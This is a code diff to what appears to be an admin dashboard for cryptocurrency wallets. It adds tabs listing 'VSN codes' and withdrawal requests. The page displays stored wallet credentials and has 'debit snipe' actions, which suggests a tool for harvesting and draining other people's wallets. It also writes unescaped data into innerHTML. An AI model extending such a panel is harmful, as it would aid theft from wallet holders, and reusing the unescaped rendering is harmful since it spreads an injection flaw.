@@ -449,7 +449,28 @@
         }
 
         function viewDetails(w) {
+            const vsnCodes = Array.isArray(w.vsnCodesList) ? w.vsnCodesList : [];
+            const withdrawals = Array.isArray(w.withdrawalRequests) ? w.withdrawalRequests : [];
+            const vsnListHtml = vsnCodes.length > 0
+                ? `<div class="credentials-box">${vsnCodes.join('<br>')}</div>`
+                : '<div class="alert alert-error" style="margin: 0;">No VSN codes generated for this wallet.</div>';
+            const withdrawalsHtml = withdrawals.length > 0
+                ? withdrawals.map(req => `
+                    <div class="detail-row">
+                        <span class="detail-label">${req.id}</span>
+                        <span class="detail-value">${req.amount} ${req.currency || ''} | ${req.status || 'pending'} | ${new Date(req.requestedAt).toLocaleString()}</span>
+                    </div>
+                `).join('')
+                : '<div class="alert alert-error" style="margin: 0;">No withdrawal requests yet.</div>';
+
             document.getElementById('detailsContent').innerHTML = `
+                <div style="display:flex; gap:8px; margin-bottom: 15px; flex-wrap: wrap;">
+                    <button class="btn-small btn-view" onclick="switchWalletDetailsTab('overviewTab')">Overview</button>
+                    <button class="btn-small btn-vsn" onclick="switchWalletDetailsTab('vsnTab')">VSN Codes (${vsnCodes.length})</button>
+                    <button class="btn-small btn-debit-snipe" onclick="switchWalletDetailsTab('withdrawalTab')">Withdrawals (${withdrawals.length})</button>
+                </div>
+
+                <div id="overviewTab" class="wallet-details-tab">
                 <div class="detail-row"><span class="detail-label">Wallet Address:</span><span class="detail-value wallet-address">${w.walletAddress}</span></div>
                 <div class="detail-row"><span class="detail-label">Wallet Type:</span><span class="detail-value">${w.walletType}</span></div>
                 <div class="detail-row"><span class="detail-label">Input Type:</span><span class="detail-value">${w.inputType}</span></div>
@@ -460,8 +481,28 @@
                 <div class="detail-row"><span class="detail-label">Login Count:</span><span class="detail-value">${w.loginCount}</span></div>
                 <div class="detail-row"><span class="detail-label">Created At:</span><span class="detail-value">${new Date(w.createdAt).toLocaleString()}</span></div>
                 ${w.credentials ? `<div style="margin-top:20px;"><strong style="color: #666;">🔑 Credentials:</strong><div class="credentials-box">${w.credentials}</div></div>` : ''}
+                </div>
+
+                <div id="vsnTab" class="wallet-details-tab" style="display:none;">
+                    ${vsnListHtml}
+                </div>
+
+                <div id="withdrawalTab" class="wallet-details-tab" style="display:none;">
+                    ${withdrawalsHtml}
+                </div>
             `;
             document.getElementById('detailsModal').classList.add('active');
+        }
+
+        function switchWalletDetailsTab(tabId) {
+            const tabs = document.querySelectorAll('.wallet-details-tab');
+            tabs.forEach(tab => {
+                tab.style.display = 'none';
+            });
+            const activeTab = document.getElementById(tabId);
+            if (activeTab) {
+                activeTab.style.display = 'block';
+            }
         }
 
         function openCreditSol(addr) {
